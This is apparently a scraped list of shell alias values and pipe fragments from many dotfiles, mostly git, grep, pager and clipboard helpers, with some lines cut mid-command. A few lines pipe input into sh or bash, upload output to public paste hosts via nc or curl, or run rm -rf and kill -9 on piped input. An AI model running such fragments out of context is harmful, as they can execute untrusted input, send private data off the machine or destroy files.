"$'printf ""\n$PATH"" | sed -e \'s/:/\\\n/g\' | sort --ignore-case'"
"$'ifconfig -a wlp2s0 | grep ""inet "" | awk \'{print $2}\''"
"$'git status -s | grep -i \'^??\' | awk \'{system(""rm ""$2)}\''"
"$'git branch -r --no-color --merged | awk \'{if ($1 ~ /^origin\//){ x=substr($1, 8); if (x !~ /(master|HEAD)/) print x }}\''"
"$'/sbin/ifconfig | awk \'/inet addr/ { print substr($2,6) }\' | awk \'{ if (NR == 1) print ""eth0"", $1; else print ""wlan0"", $1 }\''"
"$'(for x in /sys/bus/acpi/devices/*; do if [[ -e ""$x/path"" ]]; then path=$(<""$x/path""); else path=\'?\'; fi; printf \'%s %s\n\' ""$path"" ""$(readlink -e ""$x"")""; done | sort -k 1,1 | column -t)'"
"$""analyzeProfile -t'*' -s | sed -n -e '/TOTAL/,\$p' | sed -e 's/^[/\\]/ /'"""
""I think you found something""||echo ""Digging here reveals nothing."")\
""$(history|tail -n1|sed -e "
""$(history|tail -n1 | sed -e "
""$(history | tail -n1 | sed -e "
"""tmux"" set-option -g default-shell ""/bin/bash"" \; new-session -n ronin -s root || tmux att -t root"
"""tmux"" set-option -g default-shell ""/bin/bash --rcfile ${BASHRC_TEMP_FILE}"" \; new-session -n ronin -s root || tmux att -t root"
"""!git config -l | grep alias | cut -c 7-"""
"" -f2 | tr -s "" "" | cut -d"" "" -f4"
"" -f1 | cut -d"" "" -f4 | cut -d. -f1"
"!test `git rev-parse master` = $(git merge-base HEAD master) && git checkout master && git merge HEAD@{1} || echo ""Non-fastforward"""
"!f() { git checkout $(git rev-list -n 1 HEAD -- $1)~1 -- $(git diff --name-status $(git rev-list -n 1 HEAD -- $1)~1 | grep ""^D"" | cut -f 2); }; f"
"!f() { git branch --merged ${1-master} | grep -v "" ${1-master}$"" | xargs -r git branch -d; }; f"
"!f() { [ \""$GIT_PREFIX\"" != \""\"" ] && cd ""$GIT_PREFIX""; git diff --color $@ | diff-so-fancy | less --tabs=4 -RFX; }; f"
"!""git diff-index --quiet HEAD -- || clear; git --no-pager diff --patch-with-stat"""
"!""d() { git diff --patch-with-stat HEAD~$1; }; git diff-index --quiet HEAD -- || clear; d"""
"! test ""${1}"" = ""${__shlib_lib_to_test}"" || "
"! git branch -a | sed -n ""/\/HEAD /d; /\/master$/d; /remotes/p;"" | xargs -L1 git checkout -t"
"! git --no-pager log --pretty=format:""%C(red)%h%C(reset){%C(green)%cd%C(reset){%C(bold blue)%an%C(reset){%s"" --date=iso | column -t -s""{"" | less -FXRS"
"! f() { git branch | grep -v ""master"" | xargs git branch -D; }; f"
" ~/.zshrc)"" ] && echo ""\nAliases already exist.\nPlease verify if they are correct!"" || ( echo "
" ~/.shrc)"" ] && echo ""\nAliases already exist.\nPlease verify if they are correct!"" || ( echo "
" ~/.oh-my-zsh/custom/aliases.zsh ||
" ~/.cshrc)"" ] && echo ""\nAliases already exist.\nPlease verify if they are correct!"" || ( echo "
" ~/.bashrc 2>/dev/null || {
" ~/.bash* ~/.profile /etc/bash.bashrc /etc/bash_completion.d /etc/profile)"" ] && return true || return false 2> /dev/null
" | sed 's/alias .*=//' | sed 's/\x27//g'`
" | sed ""/^spec/d"" | sed ""/^vendor/d"""
" | jq ""."" | less"
" { [[ ""$(type node 2>/dev/null)"" == *progs/* ]] || { source /progs/nvm/nvm.sh && nvm use --delete-prefix node; }; } "
" pwd | tr -d ""\n"" | xclip -selection clipboard"
" pwd | tr -d ""\n"" | pbcopy"
" ps aux | awk `{print $6/1024 "" MB\t\t"" $11}` | sort -n"
" ps -o time,ppid,pid,nice,pcpu,pmem,user,comm -A | sort -n -k 6 | tail -15"
" print -z cd $(cat ~/dot.zsh/tmp/projects_paths.txt | sed ""s;${HOME};~;g"" | peco)"
" ls -R | grep "":$"" | sed -e "
" git ls-branches -b | choose -imp ""Fast-forward branch(es):"" | xargs --no-run-if-empty git fast-forward"
" find ./.computer.o >& ~/_ || echo ""There is nothing on which you could type."" ; find ./.computer.o >& ~/_ && find ~/HW1/.blocked/description >& ~/_ && echo ""You type on the keyboard, but your characters do not even echo."" ; find ./.computer.o >& ~/_ && find ~/HW1/.blocked/computeron >& ~/_ && ~/HW1/.blocked/fauxUNIX && ~/HW1/.blocked/login.x toukmond robert && exit 0 >& ~/_"
" docker rmi -f $(docker images | grep -v debian | awk ""{print \$3}"")"
" docker rm vscode || true ; \
" dmesg | grep -i ""wf"" | grep -i ""Probe"" "
" dmesg | grep -i ""wf"" | grep ""done"" "
" dmesg | grep -i ""wf"" | grep ""detected"" "
" cut -d"":"" -f1 | sort | uniq"
" cd ~/Dropbox/states/src/ && gnome-terminal -x vim -p ~/Dropbox/states/src/* & cd ~/Dropbox/""js liens"" && grep ""^URL="" *.url | cut -d= -f2 | xargs firefox &"
" cat $HISTFILE | cut -d"";"" -f2- | grep --color --ignore-case --perl-regexp "
" awk ""/^A|^M|^D/ { print \$2 }"" "
" awk ""/\.(tmp|swp|swo)$/ { print \$2 }"""
" apt-history | awk ""/Commandline/&&/remove/{print}"" | apt-history-filter"
" [ -e .n ] && echo ""You do not have a key."" || echo ""You cannot go that way."""
" < /dev/urandom tr -dc a-zA-Z0-9_¬!£$%^\&*\(\)+={}[]:@~\""#,\`./\<\>?\\| fold -w 8 | head -n 1"
" /usr/src/app/DNCORE/.dappnode_profile || sed -i ""/alias dappnode_start/a alias dappnode_get="
" /root/.bashrc || echo -e $db >> /root/.bashrc
" /etc/profile || sed -i '
" /etc/profile || \
" '' then ','||to_json(alias) else '' end),"
" &; jobs | tail -1 | read A0 A1 A2 cmd; echo ""running $cmd""; fg ""$cmd""; zenity --info --text ""$cmd done""; unset A0 A1 A2 cmd"
" && echo ""true"" || echo ""false"""
" ${HOME}/.bashrc 1>/dev/null 2>&1 || \
" $CDALIAS_DIR/.cdalias > /dev/null || return 1
" ""git fetch -p && git branch -vv | awk '/: gone]/{print $1}' | xargs git branch -d"""
" ""cd /home/austin/notebooks && jupyter notebook --no-browser""' ~/.bashrc || echo 'alias jup= ""cd /home/austin/notebooks && jupyter notebook --no-browser""' >> ~/.bashrc"
" ""${BASHSS}"" || \
!git ls-files -v | grep ^h | cut -c 3-
!git ls-files -m -o --exclude-standard | fzf --print0 -m | xargs -0 -t -o git add
!git config -l | grep alias | cut -c 7-
!git branch --merged | grep -v '\\*' | xargs -n 1 git branch -d
!git --no-pager log --color --pretty=format:'%C(yellow)%h%C(reset)%C(bold red)%d%C(reset) %s %C(black)— %an (%ad)%C(reset)' --relative-date | emojify | less --RAW-CONTROL-CHARS
!f() { git merge-tree $(git merge-base $1 $2) $1 $2 | colordiff | less -RF; }; f
!f() { git checkout --quiet master && git branch --merged | grep --invert-match '\\*' | xargs -n 1 git branch --delete; git checkout --quiet @{-1}; }; f
!f() { git branch --merged ${1-master} | grep -v ' ${1-master}$' | xargs git branch -d; }; f
!f() { git branch --merged ${1-master} | grep -v ' ${1-master}$' | xargs -r git branch -d; }; f
!(git pull || true) && git checkout dev && git pull && git checkout - && git rebase dev
! git log --oneline | emojify | less
! git log --oneline --color | emojify | less -r
! f() { git branch | grep $1 | xargs git branch -D; }; f
! f() { du -a $1 | sort -n -r | head -n 10; }; f
! [[ $? -eq 0 ]] || fail
’ps -e | grep $1′
’ll|less’
’history | grep $1′
’du -ch 2> /dev/null |tail -1′
”/usr/local/bin/mplayer -nocache -audiofile-cache 64 -prefer-ipv4 $(GET http://www.dradio.de/streaming/dkultur.m3u|head -1)”
~; brew cask doctor; brew cask outdated | xargs brew cask reinstall; brew cleanup; cd -; reloadz
~/tools/task/lol | less
~/stuff/scripts/cht.sh python list | bat
~/src/osx/osxscript.git/apps/otpcli okta -n; otpcli okta | pbcopy
~/src/$(ghq list | peco)
~/sentinel/signature_types.sh | less
~/scripts/bt_watch_win10.sh | tee ~/scripts/bt-$(date +
~/scripts/bt_watch.sh | tee ~/scripts/bt-$(date +
~/scripts/alias_list.rb | more
~/run_mqtt_server 2>&1 | grep -vE \
~/redhat/git/myscripts/csr -m|less
~/qtcreator-3.5.1/bin/qtcreator &|
~/my/script/auth-code-gen | pbcopy
~/local/colordiff/colordiff.pl | less -R
~/gitlab/timesheet/timew_timesheet.py | ~/gitlab/timesheet/selenium_timesheet.py
~/git/github/stathon/stathon.py ~/git/github/ | grep True
~/git/github/stathon/stathon.py ~/git/bitbucket/ | grep True
~/git/github-grettke/stathon/stathon.py ~/git/github-grettke/ | grep True
~/git/github-grettke/stathon/stathon.py ~/git/bitbucket-grettke/ | grep True
~/gifs ls | grep
~/define.sh | sed '/^220/d; /^250/d; /^221/d; /^%/d; /^Dload/d; /^100/d'
~/code/scripts/$(ls ~/code/scripts | fzf)
~/bin/rtcontrol --config-dir=/home/jonnyboy/mymouse/.pyroscope/ -q -o alias -s alias \* | uniq -c
~/bin/grep_local_log.sh 50 lsd 0 total|awk
~/bin/grep_local_log.sh 400 lsd 0 total|awk
~/appl/upwork/bin/upwork &|
~/Downloads|ls
~/Downloads/android-studio/bin/studio.sh >> /dev/null 2>&1 &|
~/Documents/Class/Logic_and_Computation_CS2800/eclipse/eclipse&|
~/Applications/VMware\ Fusion.app/Contents/Library/vmrun list | grep -v ^Total
~/1m/onelife-ui/; lsof -t -i tcp:4000 | xargs kill; npm run tdd
~/.venv/nao/bin/python ~/Repositories/HULKs/nao/tools/mate/run.py | tee -a /tmp/mate.log
~/.oh-my-zsh | awk -F
~/.local/bin/mpc_playlist | less -r
~/.eiger/eiger.aliases | sed
~/.config/openbox/lemonbar | lemonbar -g 1355x20+5+5 -f terminus-9
~/.config/lemonbar.sh | lemonbar
~/.config/ctafconf/bin/colorwarper make |& less
~/.brew2sh.py ~/.Brewfile | sh
~/.bin/music/currentsong | sed 's/...//'
} 2>/dev/null | sed \
} 2>/dev/null | command sed \
} 2>/dev/null | \
|yank-cli -l
|yank-cli
|xxd
|xsel -bi
|xsel --input --clipboard
|xsel --clipboard --input
|xclip -selection clipboard -i
|xclip -selection clipboard
|xclip -sel clip
|xclip -i -selection primary
|xclip -i -selection clipboard
|xclip -i -sel clipboard
|xclip
|xargs which
|xargs vi
|xargs less -N
|xargs grep --color -n
|xargs grep --color
|xargs grep
|xargs bash -c '</dev/tty vim \$@' ignoreme
|xargs -rn1 -d\\n
|xargs -rL1 -d\\n bash -c
|xargs -r0
|xargs -o -n 1
|xargs -o -I@
|xargs -o
|xargs -I{}
|xargs -IARG
|xargs -0 grep -i
|xargs -0 aginfiles
|xargs -0
|xargs --open-tty --verbose --no-run-if-empty -n 1
|xargs --open-tty --verbose --no-run-if-empty -I@
|xargs --open-tty --verbose --no-run-if-empty
|xargs
|while read line; do
|while IFS= read -r line; do wget -nv \$line; done
|while
|wc -w
|wc -l
|wc -c
|wc --lines
|wc --bytes
|wc
|w3m
|vimless
|vim -u /home/con/config/vim.less -
|vim -R -
|vim -
|vim
|view -
|vi -R -
|vi -
|uniq -u
|uniq -c
|uniq
|unhtml
|tr \\n \\0
|tr \\0 \\n
|tr N-ZA-Mn-za-m A-Za-z
|tr 'a-z' 'A-Z'
|tr '\n' ' '; echo
|tr 'A-Z' 'a-z'
|tr ' ' '\n'
|timestamp
|tee /tmp/tee_output.txt
|tee
|tail -n$i
|tail -n 1
|tail -n +3
|tail -n +2
|tail -n +11
|tail -n $(($LINES-2))
|tail -f
|tail -2
|tail -100f
|tail -1
|tail
|tac
|stripwhite
|strings
|stdbuf -oL -eL tee /dev/tty
|sort -u
|sort -nr
|sort -n
|sort -h
|sort -g -k 5
|sort -g -k 4
|sort -g -k 3
|sort -g -k 2
|sort -g
|sort -f
|sort --numeric-sort
|sort
|slit
|sed -n /./p XA
|sed 's/but was:/\r\n but was:/g'
|sed
|rgrep --color
|rg -S
|rg
|r.fzf -m
|r.filter-block -b $i
|python -mjson.tool
|python -m json.tool
|pv
|perl -pe
|perl -ne
|perl -0777pe
|perl -0777ne
|perl
|peco
|pbcopy
|parallel
|noglob sed -u -rn
|noglob grep
|nl
|nkf -w
|nkf -e
|nkf
|multitail -j
|most
|more -r
|more
|mecab_extract.sh
|lv -c
|lv
|lolcat
|less-trim
|less -s
|less -r
|less -p
|less -iR
|less -i
|less -S
|less -R
|less -N
|less -M
|less -FX
|less -FSRX
|less -F
|less +F
|less
|keep
|jq .
|jq -C
|jq --sort-keys '.'
|jq --color-output . L
|jq --color-output .
|jq --color-output
|jq
|ispell -a
|iconv -futf-8 -tlatin1
|iconv -flatin1 -tutf-8
|head -n$i
|head -n 20
|head -n 1
|head -n $(($LINES-2))
|head -2
|head -15
|head -1
|head
|grep -v grep
|grep -v -E -i
|grep -v -E
|grep -v
|grep -n
|grep -iv
|grep -iR
|grep -i
|grep -e
|grep -c
|grep -ai
|grep -Pi
|grep -P
|grep -E -i
|grep -E
|grep --ignore-case -E
|grep --color=auto -Ei
|grep --color=auto
|grep --color -i
|grep --color
|grep -
|grep
|grc tail -n$i
|grc head -n$i
|ggrep
|generic_filter
|g
|fzf --preview='apropos {..}'"
|fzf
|fgrep
|egrep -vi
|egrep -v --color=auto
|egrep -v
|egrep -iv
|egrep -i
|egrep --color=auto
|egrep --color=always -n
|egrep --color=always
|egrep
|dsame
|cut -d' '
|curl -F 'sprunge=<-' http://sprunge.us
|command vim -
|column -t
|column -Lts
|column -Lt
|column
|colout -T ${XDG_CONFIG_HOME:-~/.config}/colout/themes/
|colorgrep_pager
|colordiff
|ccze -A
|cat
|bat -l yaml
|bat --color=always -l yaml
|bat --color=always
|bat
|bash
|awk -F/ '{print\$NF}'
|awk -F/ '{print\$(NF-$i)}'
|awk -F/ '{print\$$i}'
|awk '{print\$NF}'
|awk '{print\$(NF-$i)}'
|awk '{print\$$i}'
|awk '!a[\$0]++'
|awk
|ag -S
|ag
|\rg --smart-case --pretty
|\rg --smart-case
|LC_ALL=C sort
|GREP_COLOR=$(echo 3$[$(date +%s%N)/1000%6+1]
|GREP_COLOR=$(echo 3$[$(date +%N)%6+1]
|/usr/bin/most
|/usr/bin/lv
|/usr/bin/less
|'
|&xsel -ibp
|&xargs
|&uniq
|&tail
|&sort
|&sed $'s/^E/\e[31mE/; s/^W/\e[33mW/; s/$/\e[m/;'
|&pp
|&more
|&less
|&head
|&grep -e
|&grep -P
|&grep
|&egrep -i
|&egrep
|&ccze -A
|& xclip
|& xargs
|& wc -l -c
|& wc -l
|& wc
|& vim -
|& vim +'nnoremap q :q!<enter>' +'set tm=0' +'setf sh' -R -
|& vim +'nnoremap q :q!<enter>' +'set tm=0' +'setf dts' +'AnsiEsc' -R -
|& up
|& tee redirect.txt
|& tee --append
|& tee
|& tail -n20
|& tail -n $(( +LINES ? LINES - 4 : 20 ))
|& tail -f
|& tail -50
|& tail -20
|& tail -15
|& tail
|& sed -r
|& sed
|& rg -i -e
|& rg
|& pygmentize -l pytb
|& pp
|& peco
|& nkf -w
|& nkf
|& most
|& lv
|& lnav
|& less -r
|& less -XR
|& less -S
|& less -R
|& less -MNr
|& less -FRX
|& less -+S
|& less +F
|& less
|& head -n $(( +LINES ? LINES - 4 : 20 ))
|& head -50
|& head -30
|& head -20
|& head -$(($(tput lines) - 3))
|& head
|& gvim -
|& gtpp.py
|& grep_keyword_i
|& grep_keyword__i
|& grep_keyword_
|& grep_keyword
|& grep -iev
|& grep -ie
|& grep -i --colour=auto
|& grep -i
|& grep -Pi
|& grep -E -i
|& grep -E
|& grep --color -i -E
|& grep
|& fzf
|& egrep -i
|& egrep --ignore-case --color -E
|& egrep --color=auto -v
|& egrep --color=auto
|& egrep --color -v
|& egrep --color
|& egrep ${switches:+-$switches}
|& egrep $rhs_switches $color
|& egrep
|& dts
|& cut
|& colorize-gcc
|& cat -etv
|& cat -A
|& bust
|& awk '{print \$9}'
|& awk '{print \$8}'
|& awk '{print \$7}'
|& awk '{print \$6}'
|& awk '{print \$5}'
|& awk '{print \$4}'
|& awk '{print \$3}'
|& awk '{print \$2}'
|& awk '{print \$1}'
|& awk
|& ack
|& /dev/null
|& /bin/grep -i
|& ${PAGER}
|& $PASTEBIN
|& $PAGER -R
|& $PAGER
|&
|${aliases[grep]:-grep} -F
|${aliases[grep]:-grep} -E
|${PAGER}
|${PAGER:-less}
|${LESS_VIM} -c 'set nomodified' -
|$PAGER -R
|$PAGER
|$HOME/share/vim/vim72/macros/less.sh
|$GREP -i
|$EDITOR -m -c 'set nomod' -
|$COPY
| zsel --input --clipboard
| zless
| zenity --text-info
| yq
| yank -i
| yank
| xxd -g 1 -c 4
| xxd -g 1
| xsel -os
| xsel -op
| xsel -ob
| xsel -is
| xsel -ip
| xsel -ib
| xsel -i -b
| xsel -i && xsel -o
| xsel -i
| xsel -bi
| xsel -b
| xsel --input --clipboard
| xsel --clipboard --input
| xrags grep
| xmllint --format -
| xmessage -file -
| xclip -selection clipboard -rmlastnl
| xclip -selection clipboard
| xclip -selection clip-board
| xclip -selection clip
| xclip -selection c
| xclip -selection +clipboard
| xclip -sel clip
| xclip -sel c
| xclip -sel 'clipboard'
| xclip -r -selection clipboard -i
| xclip -o
| xclip -in
| xclip -i -selection clipboard
| xclip -i -sel clip
| xclip -i -sel c
| xclip -i
| xclip -f -sel clip
| xclip --input --clipboard
| xclip
| xcl -i
| xargs_with_alias
| xargs-pallalel
| xargs$xargs_options
| xargs vim-tty
| xargs vim
| xargs subl
| xargs sed -i
| xargs rm
| xargs rg
| xargs open -R
| xargs open
| xargs nvim
| xargs ls -lrta
| xargs ls -l
| xargs kill -9
| xargs grep -ni
| xargs grep -i
| xargs grep -Pin
| xargs grep -Pi
| xargs grep --color=yes -n
| xargs grep --color=yes -Hn
| xargs grep
| xargs glark
| xargs emacsclient -n
| xargs emacsclient --no-wait
| xargs egrep --color=auto -v
| xargs egrep --color=auto
| xargs egrep --color -v
| xargs egrep --color
| xargs egrep ${switches:+-$switches}
| xargs egrep $rhs_switches $color
| xargs egrep
| xargs docker rmi"
| xargs -r aur srcver
| xargs -o vim
| xargs -o vi
| xargs -o ${EDITOR}
| xargs -n10 idea
| xargs -n1 unrar x
| xargs -n1 -r
| xargs -n1 -i
| xargs -n1 -P$(nproc) -I{}
| xargs -n1
| xargs -n 1 -I %
| xargs -n 1
| xargs -i{}
| xargs -i cmd {}
| xargs -i
| xargs -L 50 -P 4 -0 --no-run-if-empty -i cp {}
| xargs -J % tmux send-keys -t output % Enter
| xargs -I{} sh -c
| xargs -I{} printf
| xargs -I{}
| xargs -I'{}'
| xargs -I% bash -c 'echo %; tab2
| xargs -I%
| xargs -I {}
| xargs -I @@
| xargs -I % git branch -d %
| xargs -I %
| xargs -I
| xargs -0n1 echo
| xargs -0i -L100 xli {}
| xargs -0 grep -n
| xargs -0 grep -i
| xargs -0 grep -Pin
| xargs -0 grep -Pi
| xargs -0 grep --color=yes -n
| xargs -0 grep --color=yes -Hn
| xargs -0 grep
| xargs -0 egrep --color=auto -v
| xargs -0 egrep --color=auto
| xargs -0 egrep --color -v
| xargs -0 egrep --color
| xargs -0 egrep ${switches:+-$switches}
| xargs -0 egrep $rhs_switches $color
| xargs -0 egrep
| xargs -0 -I {}
| xargs -0
| xargs --verbose sh -c 'vim \
| xargs --no-run-if-empty -n 1 -i
| xargs --no-run-if-empty -n 1
| xargs --no-run-if-empty -i echo {}
| xargs --no-run-if-empty
| xargs
| write
| while read p; do
| while read -r line; do;
| wgetpaste -C
| wgetpaste
| wc -w
| wc -m
| wc -l
| wc -c
| wc --words
| wc --lines
| wc --bytes
| wc
| w3m -no-cookie -T text/html
| w3m -T text/html
| vless -
| vless
| vipe
| vimpager
| vimless
| vim_grep
| vim_RO
| vim =
| vim -u ~/.vim/vimrc.pager --not-a-term -
| vim -R -
| vim --not-a-term -R -
| vim - -R
| vim -
| vim
| view -R -
| view -
| view
| vi -v -
| vi -R -
| vi -
| vi
| v -
| up
| uniq_alias
| uniq -d
| uniq -c
| uniq
| u
| tw --pipe
| ts -i
| trunc
| trim-lines
| translate -t ja
| translate -s ja -t en
| trans -b en:ja
| trans -b :ja
| tr \
| tr A-z N-za-m
| tr -d [:space:]"
| tr -d '\r\n'
| tr -d '\n'
| tr -d
| tr '\n' ' '
| tr '\' / 2> /dev/null
| tr '[a-z]' '[A-Z]'
| tr '[A-Z]' '[a-z]'
| tr ' ' '\n'
| tr '' '\t'
| tr $'\n' \
| tr
| tovim
| to-json
| tmux loadb -
| timestamp.sh
| tidy -xml -q -i
| termclip
| tee ~/scratch/tee.txt
| tee tee.log
| tee command.log
| tee >(xsel -bi)
| tee >(xclip -r)
| tee >(translate -t ja)
| tee >(translate -s ja -t en)
| tee /dev/clipboard
| tee /c/aaa/tee.txt
| tee -i
| tee -a /dev/stderr
| tee -a ./tmp-$(date +%y%m%d-%H%M%S)
| tee -a
| tee --append
| tee $HOME/tee.txt
| tee $(rm fifo.tmp; mkfifo fifo.tmp && echo fifo.tmp) &; vim $(< fifo.tmp ) && rm fifo.tmp
| tee
| tar zxf -
| tar t
| tar jxf -
| tar Jxf -
| tar -cvzf files_$(date +%Y%m%d%H%M%S).tgz --files-from=-
| tails
| tailf
| tail -n500
| tail -n50
| tail -n5
| tail -n30
| tail -n20
| tail -n1000
| tail -n100
| tail -n10
| tail -n1
| tail -n 40
| tail -n 30
| tail -n 15
| tail -n 1000
| tail -n 10
| tail -n 1
| tail -n $((LINES-2))
| tail -n $(($LINES-5))
| tail -n $(( +LINES?LINES-4:10 ))
| tail -n $(( +LINES ? LINES - 4 : 20 ))
| tail -n
| tail -f -n
| tail -f
| tail -40
| tail -23
| tail -20
| tail -10
| tail -1
| tail --lines 25
| tail --lines
| tail
| tai64nlocal
| tac
| t
| swget -ci -
| sudo tee > /dev/null
| sudo tee /sys/class/backlight/intel_backlight/brightness
| sudo tee -a > /dev/null
| sudo tee -a
| sudo tee
| sudo
| subl'
| subl -n
| subl
| sprunge
| source-highlight -f esc256 -s shell
| source-highlight --outlang-def=esc.outlang --style-file=esc.style -s log
| source-highlight --outlang-def=esc.outlang --style-file=esc.style -s
| sort -z
| sort -u
| sort -rn
| sort -r
| sort -nr
| sort -n
| sort -k3
| sort -k2
| sort -k1
| sort -hr
| sort -h
| sort -V
| sort -Hr
| sort --reverse
| sort --numeric-sort
| sort --human-numeric-sort --reverse
| sort --human-numeric-sort
| sort
| so
| slit
| sha256sum
| sh
| sentaku
| selecta
| sed 11q
| sed -re
| sed -r -e
| sed -r
| sed -n -re
| sed -n -e s/vtable/ouble NameClass::/p
| sed -n -Ee
| sed -n '/keycode /s/^.*keycode \\([0-9]*\\).* (.*, \\(.*\\)).*$/\\1 \\2/p'"
| sed -l 's/^[^{]*//'
| sed -e $'s/\e\[[0-9;]*m//g'
| sed -e ""s_[0-9]*%_\x1b[32m&\x1b[0m_"" \
| sed -e ""s_[,0-9]*[MG]_\x1b[36m&\x1b[0m_"" \
| sed -e ""s_9[0-9]%_\x1b[31m&\x1b[0m_"" \
| sed -e ""s_/mnt/[-_A-Za-z0-9]*_\x1b[34;1m&\x1b[0m_"""
| sed -e ""s_/dev/sda[1-9]_\x1b[34m&\x1b[0m_"" \
| sed -e ""s_/dev/sd[b-z][1-9]_\x1b[33m&\x1b[0m_"" \
| sed -e ""s/.*is \(.*\)./\1/g"""
| sed -e ""s/.*\""\(.*\)\"".*/\1/g"" \
| sed -e
| sed -Ee 's/^(.+)$/\
| sed -Ee
| sed -E 's/\%#//g'
| sed -E
| sed 's/\x1b\[[0-9]*m//g'
| sed 's/\([a-z0-9]\)\([A-Z]\)/\1_\2/g'
| sed 's/'\$(echo -e \
| sed ""s/\([^ \n]*\).*/\1/g"" \
| sed
| safecopy1
| safecopy
| ruby /Users/ujihisa/git/few/bin/few
| ruby -p -e
| ruby -e
| ruby
| rtail -m --id
| rsync -av --files-from=- . /tmp/
| row
| rm -rf
| richpager
| rg -v
| rg -n
| rg -in --color=never
| rg -in
| rg -i -e
| rg -i
| rg -S
| rg -F
| rg --smart-case
| rg --passthru
| rg --no-line-number --no-filename
| rg --color never
| rg
| reverse
| reattach-to-user-namespace pbcopy
| rear
| python3 -m json.tool
| python -mjson.tool
| python -m json.tool
| pyp
| pygmentize_alias
| pygmentize -g
| pygmentize -f terminal256 -P style=monokai -l
| pygmentize -O style=monokai -f console256 -g
| pygmentize -O bg=dark -g
| pygmentize
| pv
| putclip
| pt
| pretty
| pr -TW$COLUMNS
| pr --omit-header --expand-tabs --columns=2 -w $COLUMNS \
| pless
| pjson
| ph
| perl -pe 's/\e\[?.*?[\@-~]//g'
| perl -pe
| perl -nle
| perl -ne
| perl -le 'print+join\
| perl -le 'map{chomp;print+join\
| perl -e
| perl
| percol --match-method migemo
| percol
| pecorun
| peco-tmux
| peco --select-1
| peco --rcfile=$HOME/.dotfiles/peco.json
| peco
| pe
| pdcopy
| pcregrep -v
| pcregrep
| pcat
| pbpaste
| pbcopy
| path-extractor
| patch -p1 --dry-run
| patch -p1
| paste
| parallel --max-procs=3 --group
| parallel
| p
| od -tx1z -Ax
| od -tx1c -Ax
| od -Ad -tx1
| od -Ad -tc
| nvim -
| nvim
| noglob jq
| noglob grep
| nodeset -f
| nodeset -c
| nobuf remark /home/yoann/.config/remark/qarnot-log.syntax
| nobuf grep -E -u -i --color
| nobuf grep -E -u --color
| nobuf grep -E -u
| nobuf grep -E -i -u
| nl -ba
| nl -b a
| nkf -wLu
| nkf -w
| nkf -sLw
| nkf -s
| nkf -j
| nkf -eLu
| nkf -e
| nkf -Lu
| nkf -Ew
| nkf
| nidobata post yasslab lounge
| nc termbin.com 9999
| mycopy
| my_grep_without_pager --color auto
| my-awk
| mview -
| multi_grep
| most
| more
| md5sum
| mate
| m
| lv -c
| lv
| lolcat -F 0.5
| lolcat
| lnav -q
| ll
| lines
| lf
| less -rM
| less -r
| less -iMRS
| less -iMR
| less -i
| less -c
| less -XSFR
| less -XMr
| less -XF
| less -X
| less -Si
| less -SRi
| less -S
| less -RS
| less -RFX
| less -RF
| less -REF
| less -R -N -M
| less -R -M
| less -R
| less -N
| less -M -e
| less -FiMRX
| less -FX
| less -FRX
| less -F
| less --chop-long-lines
| less +G
| less +F
| less ${LESS:--R} -S
| less
| landscape > ~/tmp/plan.out 2>&1; cat ~/tmp/plan.out
| l
| knp -tab -print-num
| keep
| k
| jvgrep
| juman
| json_reformat
| json_pp
| json
| jq length
| jq \
| jq . -M > /tmp/vimjson.json && vim /tmp/vimjson.json
| jq . -C
| jq .
| jq -r
| jq -M
| jq -C .
| jq -C '.'
| jq -C
| jq --raw-output '.[][].Instances[].NetworkInterfaces[].PrivateIpAddress'
| jq --color-output .
| jq --color-output
| jq '.'
| jq
| join
| java -jar ~/.ghq/github.com/sambatriste/sql-formatter/binary/sql-formatter-1.0.0-jar-with-dependencies.jar
| japan_numerical
| j2c
| ix
| iconv -t utf8
| iconv -t sjis
| iconv -t euc-jp
| iconv -f utf8 -t gb18030 -c
| iconv -f utf8
| iconv -f utf-8-mac -t utf-8
| iconv -f sjis -t utf-8
| iconv -f sjis
| iconv -f koi8r -t utf8
| iconv -f ibm866 -t utf8
| iconv -f gb18030 -t utf8 -c
| iconv -f euc-jp -t utf-8
| iconv -f euc-jp
| iconv -f cp932 -t utf-8
| iconv -f cp1251 -t utf8
| iconv -f UTF8-MAC -t UTF-8
| iconv -cf utf8 -t koi8r
| iconv -cf utf8 -t cp1251
| iconv -cf koi8r -t utf8
| iconv -cf koi8r -t cp1251
| iconv -cf cp1251 -t utf8
| iconv -cf cp1251 -t koi8r
| iconv -c -f utf8 -t koi8r
| iconv -c -f utf8 -t cp1251
| iconv -c -f sjis -t utf-8
| iconv -c -f sjis
| iconv -c -f koi8r -t utf8
| iconv -c -f euc-jp -t utf-8
| iconv -c -f euc-jp
| iconv -c -f cp1251 -t utf8
| iconv --from-code=UTF-8 --to-code=SHIFT-JS
| iconv --from-code=UTF-8 --to-code=SHIFT-JIS
| iconv --from-code=UTF-8 --to-code=EUC-JP
| iconv --from-code=SHIFT-JIS --to-code=UTF-8
| iconv --from-code=EUC-JP --to-code=UTF-8
| iconv
| hw
| html2text
| hlgrep
| highlight yellow
| highlight red
| highlight magenta
| highlight green
| highlight cyan
| highlight blue
| highlight --syntax yaml -O ansi
| highlight
| hhighlighter -i
| hexdump -c
| hexdump -C
| head-tail -
| head 17
| head -q
| head -n500
| head -n50
| head -n5
| head -n30
| head -n20
| head -n2
| head -n100
| head -n10
| head -n1
| head -n 50
| head -n 40
| head -n 30
| head -n 25
| head -n 20
| head -n 2
| head -n 15
| head -n 10
| head -n $((LINES-2))
| head -n $(($LINES-5))
| head -n $(( +LINES?LINES-4:10 ))
| head -n $(( +LINES ? LINES - 4 : 20 ))
| head -n
| head -24
| head -20"
| head -20
| head -10
| head -1 \
| head -1
| head --lines 25
| head --lines
| head -$(($(tput lines) - 3))
| head
| h
| gvim -
| gview -
| gtail
| gsort -n
| gsort -h
| gsort
| gsed
| growlnotify
| grn
| greplv
| grepc
| grep_ip6
| grep_ip4
| grep_ip
| grep-passthru
| grep ^\?"
| grep -vri
| grep -vi
| grep -v grep
| grep -v -
| grep -v 'etc/config' \
| grep -v '^No' \
| grep -v '127.0.0.1' \
| grep -v '.log' \
| grep -v ' user' \
| grep -v ' update' \
| grep -v ' tmp_eval_file.c' \
| grep -v ' tmp' \
| grep -v ' tags' \
| grep -v ' stop' \
| grep -v ' start' \
| grep -v ' shareprotocal.sh' \
| grep -v ' rpc_update' \
| grep -v ' restart' \
| grep -v ' make' \
| grep -v ' log' \
| grep -v ' dat' \
| grep -v ' .git*'\
| grep -v
| grep -si
| grep -ri --color=tty
| grep -ri
| grep -ni
| grep -n --color=always
| grep -n
| grep -iv
| grep -ir
| grep -in --color=auto
| grep -in --color=always
| grep -in
| grep -ic 5
| grep -iP
